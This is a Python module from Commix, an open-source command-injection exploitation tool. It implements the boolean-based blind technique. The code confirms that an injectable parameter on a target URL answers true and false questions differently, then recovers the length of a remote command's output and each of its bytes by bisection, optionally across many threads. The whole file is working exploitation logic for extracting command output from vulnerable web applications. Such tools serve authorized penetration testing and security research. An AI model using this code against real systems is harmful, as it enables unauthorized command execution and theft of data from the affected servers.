#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import threading

from src.utils import settings
from src.utils import progress
from src.core.parse import cmdline as menu
from src.core.controller import checks
from src.core.techniques.boolean_based import bb_injector as injector

try:
  import concurrent.futures
  _THREADS_SUPPORTED = True
except ImportError:
  # "concurrent.futures" needs Python 3.2+; fall back to serial on Python 2.
  _THREADS_SUPPORTED = False

"""
Everything this technique needs to ask a question, kept together so the bisection below reads as the
search it is rather than as an argument list.
"""
class Channel(object):
  def __init__(self, separator, prefix, suffix, whitespace, http_request_method, url, vuln_parameter):
    self.separator = separator
    self.prefix = prefix
    self.suffix = suffix
    self.whitespace = whitespace
    self.http_request_method = http_request_method
    self.url = url
    self.vuln_parameter = vuln_parameter

  def ask(self, payload):
    return injector.ask(payload, self.prefix, self.suffix, self.whitespace,
                        self.http_request_method, self.url, self.vuln_parameter)

"""
Whether the target answers a question it was never asked before differently from one it was.

Two questions with known answers, and the page has to tell them apart - otherwise what is being read
is not an answer at all, and everything bisected on it would be noise.
"""
def confirm(channel):
  payloads = checks.boolean_based_payloads()
  holds = channel.ask(payloads.condition_check(channel.separator, holds=True))
  fails = channel.ask(payloads.condition_check(channel.separator, holds=False))
  if holds is None or fails is None:
    return False
  return holds is True and fails is False

"""
The largest N the answer is still yes for, found by halving rather than by counting.
"""
def _bisect(channel, question, low, high):
  found = None
  while low <= high:
    middle = (low + high) // 2
    answer = channel.ask(question(middle))
    if answer is None:
      return None
    if answer:
      found = middle
      low = middle + 1
    else:
      high = middle - 1
  return found

"""
How many bytes the command's output is.
"""
def output_length(channel, cmd, ceiling=None):
  ceiling = ceiling or settings.MAXLEN
  payloads = checks.boolean_based_payloads()
  info_msg = "Retrieving the length of execution output"
  info_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
  settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
  # A dot per question, the way the techniques that wait for their answer mark theirs off.
  def question(candidate):
    asked = payloads.get_length(channel.separator, cmd, candidate, operator="-ge")
    if settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(".")
    return asked
  length = _bisect(channel, question, 0, int(ceiling))
  if length and settings.VERBOSITY_LEVEL == 0:
    settings.print_data_to_stdout(" (done)")
  if length and length > 1:
    settings.print_data_to_stdout(settings.print_info_msg("Retrieved: " + str(length)))
  return length

"""
One byte of the output, found by bisecting its ordinal.
"""
def _byte_at(channel, cmd, position):
  payloads = checks.boolean_based_payloads()
  question = lambda candidate: payloads.get_char(channel.separator, cmd, position, candidate, operator="-le")
  return _bisect(channel, question, min(settings.CHAR_POOL_MULTI), max(settings.CHAR_POOL_MULTI))

"""
The command's output, one byte at a time, each found by bisecting its ordinal.

Nothing is waited for and nothing is written anywhere: every byte costs the questions it takes to
halve the range it sits in, which is what makes this the cheapest of the blind channels.

Where the run was given threads, the bytes are read at the same time as one another. Each byte's
own search is a sequence - a half answered before the next is asked - but no byte's search depends
on another's, and nothing here is being timed, so requests that overlap cost the answer nothing.
That is what the time-related techniques cannot do: for them, overlapping requests are the
measurement.
"""
def retrieve(channel, cmd, length=None):
  length = output_length(channel, cmd) if length is None else length
  if not length:
    return ""
  positions = list(range(1, length + 1))
  workers = settings.THREADS if (settings.THREADS > 1 and _THREADS_SUPPORTED) else 1
  base = "Retrieving the execution output"
  # Worth saying here and nowhere else: every byte is a request and none of them is being timed, so
  # asking for several at once costs the answer nothing - which is not true of the other blind ones.
  if workers == 1 and length > 1 and not settings.BOOLEAN_THREADS_SUGGESTED:
    settings.BOOLEAN_THREADS_SUGGESTED = True
    info_msg = "Nothing here is timed, so '--threads' asks for several bytes at once without costing accuracy."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  resolved, lock = {}, threading.Lock()
  eta_bar = progress.ProgressBar(maxvalue=length) if menu.options.eta else None
  if eta_bar is None and length > 1:
    settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(base + ": "))

  # What has been resolved from the first byte onward - a later byte is held back until the ones
  # before it are in, so the line only ever grows and never shows a hole.
  def _so_far():
    out = ""
    for position in positions:
      if resolved.get(position) is None:
        break
      out += chr(resolved[position])
    return out

  # Rendered the way the time-related techniques render theirs, and for the same reasons: a byte not
  # asked for yet is "_", one that could not be read is marked, a character that cannot be shown as
  # itself becomes a space, and only the tail of a long output is kept - a line that is rewritten in
  # place has to stay on one line, which a newline or an overlong output would take it off.
  def _display():
    chars, furthest = [], 0
    for index, position in enumerate(positions, 1):
      if position not in resolved:
        chars.append("_")
        continue
      ascii_char = resolved[position]
      if ascii_char is None:
        chars.append(settings.UNRESOLVED_CHAR)
      else:
        char = chr(ascii_char)
        chars.append(char if char.isprintable() else settings.SINGLE_WHITESPACE)
      furthest = index
    return checks.progress_display_text(chars, furthest, length)

  def _note():
    with lock:
      if eta_bar is not None:
        eta_bar.progress(sum(1 for position in positions if resolved.get(position) is not None))
      else:
        settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(base + ": " + _display()))

  def _resolve(position):
    resolved[position] = _byte_at(channel, cmd, position)
    _note()

  if workers == 1:
    for position in positions:
      _resolve(position)
      if resolved[position] is None:
        break
  else:
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(workers, length)) as executor:
      list(executor.map(_resolve, positions))

  output = _so_far()
  if settings.VERBOSITY_LEVEL == 0:
    settings.close_progress_line()
  return output

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, timesec, filename, http_request_method, injection_type, technique):
  from src.core.controller import handler
  return handler.do_boolean_based_process(url, timesec, filename, http_request_method, injection_type, technique)

# eof
